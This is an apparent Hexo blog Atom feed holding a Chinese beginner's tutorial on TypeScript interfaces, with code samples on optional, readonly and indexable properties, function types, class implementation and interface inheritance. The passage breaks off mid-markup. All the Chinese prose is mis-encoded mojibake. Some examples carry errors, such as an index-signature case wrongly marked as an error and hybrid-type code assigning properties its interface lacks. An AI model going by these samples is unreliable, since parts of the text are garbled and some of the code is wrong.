<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>å†·æš–æˆ‘è‡ªçŸ¥</title>
  
  <subtitle>è¿™ä¸ªå‰ç«¯æœ‰ç‚¹èœã€‚</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/TheNightElf/"/>
  <updated>2018-01-20T07:47:53.223Z</updated>
  <id>https://github.com/TheNightElf/</id>
  
  <author>
    <name>å†·æš–æˆ‘è‡ªçŸ¥</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Typescriptå­¦ä¹ æ—¥è®°(äºŒ)</title>
    <link href="https://github.com/TheNightElf/2018/01/18/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2018/01/18/Typescriptå­¦ä¹ æ—¥è®°ï¼ˆäºŒï¼‰/</id>
    <published>2018-01-18T09:59:42.000Z</published>
    <updated>2018-01-20T07:47:53.223Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬ç¯‡ä»‹ç» <code>typescript</code> ä¸­æ¥å£çš„ä½¿ç”¨æ–¹å¼ã€‚<br><a id="more"></a></p><h3 id="æ¥å£-interface"><a href="#æ¥å£-interface" class="headerlink" title="æ¥å£(interface)"></a>æ¥å£(interface)</h3><p><code>TypeScript</code>çš„æ ¸å¿ƒåŸåˆ™ä¹‹ä¸€æ˜¯å¯¹å€¼æ‰€å…·æœ‰çš„ç»“æ„è¿›è¡Œç±»å‹æ£€æŸ¥ã€‚æ¥å£çš„ä½œç”¨å°±æ˜¯ä¸ºè¿™äº›ç±»å‹å‘½åå’Œä¸ºä½ çš„ä»£ç æˆ–ç¬¬ä¸‰æ–¹ä»£ç å®šä¹‰å¥‘çº¦ã€‚<br>åŸºç¡€ç±»å‹æ˜¯ä¸ºç®€å•çš„å˜é‡å®šä¹‰ç±»å‹ï¼Œ<strong>é€šå¸¸çš„ï¼Œæ¥å£å°±æ˜¯ä¸ºä½ æ‰€å®šä¹‰çš„å¯¹è±¡(å‚æ•°ã€å‡½æ•°ç­‰)çš„æ·»åŠ ç±»å‹çš„çº¦æŸã€‚</strong><br>æŒ‰ç…§ typescript çš„é»˜è®¤çº¦å®šï¼Œæ¥å£é€šå¸¸æ˜¯ä»¥ <code>é©¼å³°å‘½åæ–¹å¼ï¼Œå¤§å†™å­—æ¯å¼€å¤´</code> çš„æ–¹å¼å®šä¹‰ã€‚</p><h4 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªæ¥å£çº¦æŸ</span></span><br><span class="line">interface T &#123;</span><br><span class="line">    num: number;</span><br><span class="line">    str: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°çš„æ¥å—çš„å‚æ•°ä¸­ï¼Œnumå¿…é¡»ä¸ºnumberç±»å‹ï¼Œstrå¿…é¡»ä¸ºstringç±»å‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: T</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> arg.num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¹Ÿå¯ä»¥ç›´æ¥æŠŠçº¦æŸæ¡ä»¶å†™åœ¨å‡½æ•°å‚æ•°ä¸­ï¼Œä¸ºäº†å¯è¯»æ€§ï¼Œæ¨èåœ¨å¤–é¢å®šä¹‰</span></span><br><span class="line"><span class="comment">// eg:</span></span><br><span class="line"><span class="comment">// function demo(arg: &#123; num: number; str: string &#125;) &#123;</span></span><br><span class="line"><span class="comment">//     console.log(typeof arg.num)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="attr">num</span>: <span class="number">100</span>, <span class="attr">str</span>: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj1) <span class="comment">// success -&gt; number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;<span class="attr">num</span>: <span class="string">'123'</span>, <span class="attr">str</span>: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj2) <span class="comment">// error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj3 = &#123;<span class="attr">num</span>: <span class="number">123</span>&#125;</span><br><span class="line">demo(obj3) <span class="comment">// error ç¼ºå°‘ä¸€ä¸ª str å‚æ•°</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šå®šä¹‰æ¥å£çš„æ—¶å€™ä¸éœ€è¦ä½¿ç”¨ <code>=</code>ï¼Œ<code>{}</code> å†…éƒ¨å¿…é¡»ä½¿ç”¨ <code>åˆ†å·(;)</code> åˆ†éš”ã€‚</strong></p><h4 id="æ¥å£çš„å¯é€‰å±æ€§"><a href="#æ¥å£çš„å¯é€‰å±æ€§" class="headerlink" title="æ¥å£çš„å¯é€‰å±æ€§"></a>æ¥å£çš„å¯é€‰å±æ€§</h4><p>æ¥å£é‡Œçš„å±æ€§ä¸å…¨éƒ½æ˜¯å¿…éœ€çš„ã€‚ æœ‰äº›æ˜¯åªåœ¨æŸäº›æ¡ä»¶ä¸‹å­˜åœ¨ï¼Œæˆ–è€…æ ¹æœ¬ä¸å­˜åœ¨ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">interface T &#123;</span><br><span class="line">    num: number;</span><br><span class="line">    str?: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: T</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> arg.num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj4 = &#123;<span class="attr">num</span>: <span class="number">100</span>, <span class="attr">str</span>: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj4) <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj5 = &#123;<span class="attr">num</span>: <span class="number">100</span>&#125;</span><br><span class="line">demo(obj5) <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj6 = &#123;<span class="attr">str</span>: <span class="string">'typescript'</span>&#125;</span><br><span class="line">demo(obj6) <span class="comment">// error</span></span><br></pre></td></tr></table></figure><h4 id="æ¥å£çš„åªè¯»å±æ€§"><a href="#æ¥å£çš„åªè¯»å±æ€§" class="headerlink" title="æ¥å£çš„åªè¯»å±æ€§"></a>æ¥å£çš„åªè¯»å±æ€§</h4><p>è¿™é‡Œçš„ <code>åªè¯»å±æ€§</code> ç±»ä¼¼äºåŸç”Ÿjavascriptçš„ <code>const</code> å…³é”®å­—ï¼Œåœ¨èµ‹å€¼ä¹‹åå°±ä¸èƒ½æ›´æ”¹äº†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface Rd &#123;</span><br><span class="line">    readonly x: number;</span><br><span class="line">    readonly y: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r: Rd = &#123; <span class="attr">x</span>: <span class="number">100</span>, <span class="attr">y</span>: <span class="string">'str'</span> &#125;</span><br><span class="line"></span><br><span class="line">r.x = <span class="number">123</span>; <span class="comment">// -&gt; error</span></span><br></pre></td></tr></table></figure><h4 id="åªè¯»çš„æ•°ç»„"><a href="#åªè¯»çš„æ•°ç»„" class="headerlink" title="åªè¯»çš„æ•°ç»„"></a>åªè¯»çš„æ•°ç»„</h4><p>TypeScriptå…·æœ‰ <code>ReadonlyArray&lt;T&gt;</code> ç±»å‹ï¼Œå®ƒä¸ <code>Array&lt;T&gt;</code> ç›¸ä¼¼ï¼Œåªæ˜¯æŠŠæ‰€æœ‰å¯å˜æ–¹æ³•å»æ‰äº†ï¼Œå› æ­¤å¯ä»¥ç¡®ä¿æ•°ç»„åˆ›å»ºåå†ä¹Ÿä¸èƒ½è¢«ä¿®æ”¹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: ReadonlyArray&lt;number&gt; = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">2</span>; <span class="comment">// -&gt; error</span></span><br><span class="line">arr.push(<span class="number">5</span>); <span class="comment">// -&gt; error</span></span><br><span class="line">arr.length = <span class="number">10</span>; <span class="comment">// -&gt; error</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr1: <span class="built_in">Array</span>&lt;number&gt; = arr;</span><br><span class="line"><span class="comment">// error, arr æ˜¯ReadonlyArrayï¼Œä¸èƒ½èµ‹å€¼ç»™åˆ«çš„æ•°ç»„</span></span><br></pre></td></tr></table></figure><h4 id="readonlyè¿˜æ˜¯const"><a href="#readonlyè¿˜æ˜¯const" class="headerlink" title="readonlyè¿˜æ˜¯const"></a>readonlyè¿˜æ˜¯const</h4><p>æœ€ç®€å•åˆ¤æ–­è¯¥ç”¨readonlyè¿˜æ˜¯constçš„æ–¹æ³•æ˜¯çœ‹è¦æŠŠå®ƒåšä¸ºå˜é‡ä½¿ç”¨è¿˜æ˜¯åšä¸ºä¸€ä¸ªå±æ€§ã€‚<br>åšä¸ºå˜é‡ä½¿ç”¨çš„è¯ç”¨ constï¼Œè‹¥åšä¸ºå±æ€§åˆ™ä½¿ç”¨readonlyã€‚</p><h4 id="é¢å¤–çš„å±æ€§æ£€æŸ¥"><a href="#é¢å¤–çš„å±æ€§æ£€æŸ¥" class="headerlink" title="é¢å¤–çš„å±æ€§æ£€æŸ¥"></a>é¢å¤–çš„å±æ€§æ£€æŸ¥</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Pc &#123;</span><br><span class="line">    x?: number;</span><br><span class="line">    y?: string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params">arg: Pc</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo(&#123;<span class="attr">x</span>: <span class="number">100</span>, <span class="attr">z</span>: <span class="number">110</span>&#125;)</span><br><span class="line"><span class="comment">// errorï¼Œå› ä¸º z å¹¶æ²¡æœ‰åœ¨æ¥å£ Pc ä¸­å®šä¹‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ç±»å‹æ–­è¨€æ”¹å†™</span></span><br><span class="line">demo(&#123;<span class="attr">x</span>: <span class="number">100</span>, <span class="attr">z</span>: <span class="number">110</span>&#125; <span class="keyword">as</span> Pc)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘Šè¯‰ ts å…¥å‚ '&#123;x: 100, z: 110&#125;' éƒ½æ˜¯æ¥è‡ªäº Pc æ¥å£çš„ï¼Œä½ åˆ« tmd å†å¸®æˆ‘æ£€æŸ¥äº†</span></span><br><span class="line"><span class="comment">// tsï¼š å¥½å§ï¼Œæ—¢ç„¶ä½ è¿™ä¹ˆç¡®å®šï¼Œæˆ‘å°±å¬ä½ çš„ã€‚</span></span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šé¢çš„è¿™ç§åšæ³•å¹¶ä¸æ˜¯æœ€ä½³çš„åšæ³•ï¼Œæœ€ä½³çš„åšæ³•æ˜¯æ·»åŠ ä¸€ä¸ª <code>å ä½ç”¨çš„ç­¾å</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// æˆ‘ä¸çŸ¥é“æˆ‘åé¢è¿˜ä¼šä¼ ä»€ä¹ˆå±æ€§è¿›æ¥ï¼Œæ‰€ä»¥æˆ‘å…ˆç”¨ä¸ª propsName å ä¸ªä½ç½®</span></span><br><span class="line">interface Pc &#123;</span><br><span class="line">    x?: number;</span><br><span class="line">    y?: string;</span><br><span class="line">    [propName: string]: any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">demo(&#123;<span class="attr">x</span>: <span class="number">100</span>, <span class="attr">z</span>: <span class="number">110</span>&#125;)</span><br><span class="line"><span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="å‡½æ•°ç±»å‹"><a href="#å‡½æ•°ç±»å‹" class="headerlink" title="å‡½æ•°ç±»å‹"></a>å‡½æ•°ç±»å‹</h4><p>ä¸ºäº†ä½¿ç”¨æ¥å£è¡¨ç¤ºå‡½æ•°ç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦ç»™æ¥å£å®šä¹‰ä¸€ä¸ªè°ƒç”¨ç­¾åã€‚ å®ƒå°±åƒæ˜¯ä¸€ä¸ª <code>åªæœ‰å‚æ•°åˆ—è¡¨å’Œè¿”å›å€¼ç±»å‹</code> çš„å‡½æ•°å®šä¹‰ã€‚<br><strong>å‚æ•°åˆ—è¡¨é‡Œçš„æ¯ä¸ªå‚æ•°éƒ½éœ€è¦åå­—å’Œç±»å‹ã€‚</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Fn &#123;</span><br><span class="line">    (a: number, <span class="attr">b</span>: string): boolean</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ª Fn å‡½æ•°æ¥å£ï¼Œè¯¥å‡½æ•°æ¥å— a: numberï¼Œb: string ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ª boolean å€¼</span></span><br></pre></td></tr></table></figure><h4 id="å¯ç´¢å¼•çš„ç±»å‹"><a href="#å¯ç´¢å¼•çš„ç±»å‹" class="headerlink" title="å¯ç´¢å¼•çš„ç±»å‹"></a>å¯ç´¢å¼•çš„ç±»å‹</h4><p>å¯ç´¢å¼•ç±»å‹å…·æœ‰ä¸€ä¸ª <code>ç´¢å¼•ç­¾å</code>ï¼Œå®ƒæè¿°äº†å¯¹è±¡ <code>ç´¢å¼•çš„ç±»å‹</code>ï¼Œè¿˜æœ‰ç›¸åº”çš„ç´¢å¼• <code>è¿”å›å€¼ç±»å‹</code>ã€‚<br>å…±æœ‰ä¸¤ç§ç´¢å¼•ç­¾åï¼šå­—ç¬¦ä¸²å’Œæ•°å­—ã€‚å¯ä»¥åŒæ—¶ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç´¢å¼•ï¼Œä½†æ˜¯æ•°å­—ç´¢å¼•çš„è¿”å›å€¼å¿…é¡»æ˜¯å­—ç¬¦ä¸²ç´¢å¼•è¿”å›å€¼ç±»å‹çš„å­ç±»å‹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. æŒ‡å®š ç´¢å¼•ç±»å‹ ä¸º number</span></span><br><span class="line">interface IndexNum &#123;</span><br><span class="line">    [index: number]: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr: IndexNum = [<span class="string">'hello'</span>, <span class="string">'world'</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. æŒ‡å®š ç´¢å¼•ç±»å‹ ä¸º string</span></span><br><span class="line">interface IndexStr &#123;</span><br><span class="line">    [index: string]: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj: IndexStr = &#123;<span class="string">'x'</span>: <span class="string">'hello'</span>, <span class="string">'y'</span>: <span class="string">'world'</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj[<span class="string">'x'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. åŒæ—¶æŒ‡å®š ç´¢å¼•ç±»å‹ ä¸º number å’Œ string</span></span><br><span class="line"></span><br><span class="line">interface TotalIndex &#123;</span><br><span class="line">    [index: number]: number;</span><br><span class="line">    at: number; <span class="comment">// success</span></span><br><span class="line">    where: string; <span class="comment">// error ä½¿ç”¨ where è·å–å€¼æ—¶è¿”å›çš„æ˜¯ string ç±»å‹</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. åªè¯»çš„ç´¢å¼•ç±»å‹</span></span><br><span class="line"></span><br><span class="line">interface RdIndex &#123;</span><br><span class="line">    readonly [index: number]: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr: RdIndex = [<span class="string">'a'</span>,<span class="string">'b'</span>]</span><br><span class="line"></span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">'c'</span>; <span class="comment">// error, arr ä¸ºåªè¯»çš„ç´¢å¼•ç±»å‹</span></span><br></pre></td></tr></table></figure><h4 id="â€˜ç±»â€™ç±»å‹"><a href="#â€˜ç±»â€™ç±»å‹" class="headerlink" title="â€˜ç±»â€™ç±»å‹"></a>â€˜ç±»â€™ç±»å‹</h4><p>å’Œå…¶å®ƒçš„ç±»å‹çº¦æŸç›¸ä¼¼ï¼Œç±»ç±»å‹ä½¿ç”¨ <code>implements</code> å®ç°æ¥å£ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰æ–¹å¼å®Œå…¨ä¸€è‡´</span></span><br><span class="line">interface C &#123;</span><br><span class="line">    date: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clock</span> <span class="title">implements</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    date: <span class="built_in">Date</span>;</span><br><span class="line">    setTime(d: <span class="built_in">Date</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.date = d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">constructor</span>(h: number, m: number) &#123;</span><br><span class="line">        <span class="comment">// ..</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³äºæ›´å¤šçš„ <code>implements</code> çš„ç”¨æ³•æˆ‘ç›®å‰ä¹Ÿä¸æ˜¯ç‰¹åˆ«çš„æ¸…æ¥šï¼Œæ‰€ä»¥ä¸‹é¢å°±ä¸å†è¯¦ç»†å™è¿°äº†ã€‚<br>ç­‰æˆ‘äº†è§£æ¸…æ¥šä¹‹åå†è¡¥ä¸Šè¿™ä¸€éƒ¨åˆ†å†…å®¹ï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥çœ‹<a href="https://www.tslang.cn/docs/handbook/interfaces.html" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>äº†è§£ã€‚</p><h4 id="ç»§æ‰¿æ¥å£"><a href="#ç»§æ‰¿æ¥å£" class="headerlink" title="ç»§æ‰¿æ¥å£"></a>ç»§æ‰¿æ¥å£</h4><p>å’Œ <code>es2015</code> ä¸­çš„ <code>extends</code> ä¸€æ ·ï¼Œæ¥å£ä¹Ÿæ˜¯å¯ä»¥åƒç±»ä¸€æ ·ç”¨æ¥ç»§æ‰¿çš„ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">interface A &#123;</span><br><span class="line">    a: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface C &#123;</span><br><span class="line">    c: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface B extends A, C &#123;</span><br><span class="line">    b: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &lt;B&gt;&#123;&#125;;</span><br><span class="line">obj.a = 10;</span><br><span class="line">obj.b = '10';</span><br><span class="line">obj.c = 10;</span><br></pre></td></tr></table></figure><h4 id="æ··åˆç±»å‹"><a href="#æ··åˆç±»å‹" class="headerlink" title="æ··åˆç±»å‹"></a>æ··åˆç±»å‹</h4><p><code>interface</code> è¿˜å¯ä»¥åœ¨ä¸€ä¸ªæ¥å£ä¸­çº¦æŸ <code>javascript</code> ä¸­å¤šä¸ªç±»å‹ï¼›</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Counter &#123;</span><br><span class="line">    a: <span class="built_in">number</span>; <span class="comment">// çº¦æŸ a ä¸º number ç±»å‹</span></span><br><span class="line">    getStr(): <span class="built_in">void</span>;<span class="comment">// çº¦æŸ getStr æ— è¿”å›å€¼ï¼›</span></span><br><span class="line">    (n: <span class="built_in">number</span>): <span class="built_in">string</span>;<span class="comment">// çº¦æŸåŒ¿åå‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•° n ä¸º number ç±»å‹ï¼Œè¿”å›å€¼ string ç±»å‹</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•° getCounter è¿”å›å€¼è¢« Counter çº¦æŸ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCounter</span>(<span class="params"></span>): <span class="title">Counter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> counter = &lt;Counter&gt;<span class="function"><span class="keyword">function</span> (<span class="params">start: <span class="built_in">number</span></span>) </span>&#123; &#125;; <span class="comment">// ç±»å‹æ–­è¨€</span></span><br><span class="line">    counter.interval = <span class="number">123</span>;</span><br><span class="line">    counter.reset = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; &#125;;</span><br><span class="line">    <span class="keyword">return</span> counter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = getCounter();</span><br><span class="line">c(<span class="number">10</span>);</span><br><span class="line">c.reset();</span><br><span class="line">c.interval = <span class="number">5.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// è¿™ä¸ªæ¨¡ç‰ˆæœ‰é—®é¢˜ï¼Œå†™ ts çš„ä»£ç å°±ä¼šå‡ºé—®é¢˜</span></span><br><span class="line"><span class="comment">// åªèƒ½è¿™æ ·äº†</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><h4 id="æ¥å£ç»§æ‰¿ç±»"><a href="#æ¥å£ç»§æ‰¿ç±»" class="headerlink" title="æ¥å£ç»§æ‰¿ç±»"></a>æ¥å£ç»§æ‰¿ç±»</h4><p>æ¥å£ç»§æ‰¿ç±»æ—¶ä¼šç»§æ‰¿çˆ¶ç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼ŒåŒ…æ‹¬ <code>private</code> å’Œ <code>protected</code> æˆå‘˜ã€‚<br>è¿™æ„å‘³ç€å½“ä½ åˆ›å»ºäº†ä¸€ä¸ªæ¥å£ç»§æ‰¿äº†ä¸€ä¸ªæ‹¥æœ‰ <code>ç§æœ‰æˆ–å—ä¿æŠ¤çš„æˆå‘˜</code> çš„ç±»æ—¶ï¼Œè¿™ä¸ªæ¥å£ç±»å‹åªèƒ½è¢« <code>è¿™ä¸ªç±»æˆ–å…¶å­ç±»</code> æ‰€å®ç°ï¼ˆimplementï¼‰ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    private state: any;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SelectableControl å«æœ‰ Control æ‰€æœ‰çš„å±æ€§æ–¹æ³•</span></span><br><span class="line">interface SelectableControl extends Control &#123;</span><br><span class="line">    select(): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Button ç»§æ‰¿è‡ª Control å«æœ‰ Control æ‰€æœ‰çš„å±æ€§æ–¹æ³•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span> <span class="keyword">extends</span> <span class="title">Control</span> <span class="title">implements</span> <span class="title">SelectableControl</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TextBox ç»§æ‰¿è‡ª Control å«æœ‰ Control æ‰€æœ‰çš„å±æ€§æ–¹æ³•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TextBox</span> <span class="keyword">extends</span> <span class="title">Control</span> </span>&#123;</span><br><span 